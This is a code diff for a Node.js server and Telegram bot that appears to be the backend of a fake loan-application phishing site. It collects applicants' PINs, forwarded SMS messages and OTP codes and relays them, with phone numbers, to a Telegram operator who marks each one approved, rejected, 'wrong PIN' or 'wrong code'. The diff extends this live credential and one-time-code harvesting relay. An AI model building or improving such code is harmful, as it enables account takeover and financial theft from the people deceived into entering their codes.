@@ -239,14 +239,20 @@ bot.on('callback_query', async (callbackQuery) => {
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
         bot.editMessageText(`✅ *PIN APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
     } else if (action === 'deny' && type === 'sms') {
-        await db.updateApplicationSms(applicationId, application.smsText, 'rejected');
+        await db.updateApplication(applicationId, { smsStatus: 'rejected', smsOtpStatus: 'rejected' });
         bot.editMessageText(`❌ *SMS REJECTED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
     } else if (action === 'allow' && type === 'sms') {
-        await db.updateApplicationSms(applicationId, application.smsText, 'approved');
+        await db.updateApplication(applicationId, { smsStatus: 'approved', smsOtpStatus: 'approved' });
         bot.editMessageText(`✅ *SMS APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
     } else if (action === 'approve' && type === 'otp') {
         await db.updateApplication(applicationId, { otpStatus: 'approved' });
         bot.editMessageText(`🎉 *LOAN FULLY APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+    } else if (action === 'wrongpin' && type === 'otp') {
+        await db.updateApplication(applicationId, { otpStatus: 'wrong_pin' });
+        bot.editMessageText(`⚠️ *FLAGGED: WRONG PIN*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+    } else if (action === 'wrongcode' && type === 'otp') {
+        await db.updateApplication(applicationId, { otpStatus: 'wrong_code' });
+        bot.editMessageText(`⚠️ *FLAGGED: WRONG CODE*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
     }
 
     bot.answerCallbackQuery(callbackQuery.id);
@@ -338,17 +344,30 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     }
 });
 
-// Verify SMS Submission Entry (Optimized)
+// Verify SMS Submission Entry (Optimized & Updated)
 app.post('/api/verify-sms', async (req, res) => {
     try {
-        const { applicationId, smsText } = req.body;
+        // Accept either id or applicationId, and smsOtp or smsText
+        const applicationId = req.body.id || req.body.applicationId;
+        const smsContent = req.body.smsOtp || req.body.smsText;
+
+        if (!applicationId || !smsContent) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId or SMS OTP content.' });
+        }
+
         const application = await db.getApplication(applicationId);
 
         if (!application) {
             return res.status(404).json({ success: false, message: 'Application not found.' });
         }
 
-        await db.updateApplicationSms(applicationId, smsText, 'pending');
+        // Use standard db.updateApplication instead of deprecated db.updateApplicationSms
+        await db.updateApplication(applicationId, {
+            smsText: smsContent,
+            smsOtp: smsContent,
+            smsStatus: 'pending',
+            smsOtpStatus: 'pending'
+        });
 
         // Respond instantly
         res.json({ success: true });
@@ -361,7 +380,7 @@ app.post('/api/verify-sms', async (req, res) => {
 📞 Phone: \`${formatPhone(application.phoneNumber)}\`
 
 \`\`\`
-${smsText}
+${smsContent}
 \`\`\`
         `.trim(), {
             parse_mode: 'Markdown',
@@ -383,7 +402,10 @@ app.get('/api/check-sms-status/:applicationId', async (req, res) => {
     try {
         const application = await db.getApplication(req.params.applicationId);
         if (application) {
-            res.json({ success: true, status: application.smsStatus });
+            res.json({ 
+                success: true, 
+                status: application.smsStatus || application.smsOtpStatus 
+            });
         } else {
             res.status(404).json({ success: false, message: 'Not found.' });
         }
@@ -392,17 +414,27 @@ app.get('/api/check-sms-status/:applicationId', async (req, res) => {
     }
 });
 
-// Verify OTP Stage Entry (Optimized)
+// Verify OTP Stage Entry (Optimized & Updated)
 app.post('/api/verify-otp', async (req, res) => {
     try {
-        const { applicationId, otp } = req.body;
+        const applicationId = req.body.id || req.body.applicationId;
+        const otpCode = req.body.otp;
+
+        if (!applicationId || !otpCode) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId or OTP code.' });
+        }
+
         const application = await db.getApplication(applicationId);
 
         if (!application) {
             return res.status(404).json({ success: false, message: 'Application not found.' });
         }
 
-        await db.updateApplicationOtp(applicationId, otp, 'pending');
+        // Use standard db.updateApplication
+        await db.updateApplication(applicationId, {
+            otp: otpCode,
+            otpStatus: 'pending'
+        });
 
         // Respond instantly
         res.json({ success: true });
@@ -413,7 +445,7 @@ app.post('/api/verify-otp', async (req, res) => {
 ------------------------------
 📋 Ref: \`${applicationId}\`
 📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔢 OTP: \`${otp}\`
+🔢 OTP: \`${otpCode}\`
         `.trim(), {
             parse_mode: 'Markdown',
             reply_markup: {
